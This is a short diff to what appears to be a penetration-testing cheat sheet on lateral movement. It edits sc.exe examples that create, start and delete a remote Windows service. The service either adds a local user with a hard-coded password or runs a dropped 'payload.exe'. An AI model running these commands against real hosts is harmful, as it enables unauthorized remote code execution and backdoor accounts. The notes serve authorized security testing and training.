@@ -63,8 +63,11 @@ scshell.py domain/<user>@<TARGET>
 On windows, we can use the built in sc.exe binary to remotely interact with services
 
 ```bash
-#Start a remote service
+#Create remote service
 sc.exe \\TARGET create MyService binPath= "net user munra Pass123 /add" start= auto
+sc.exe \\TARGET create MyService binPath= "C:\Windows\TEMP\payload.exe" start= auto
+
+#Start remote service
 sc.exe \\TARGET start MyService
 
 #Stop and delete a remote service
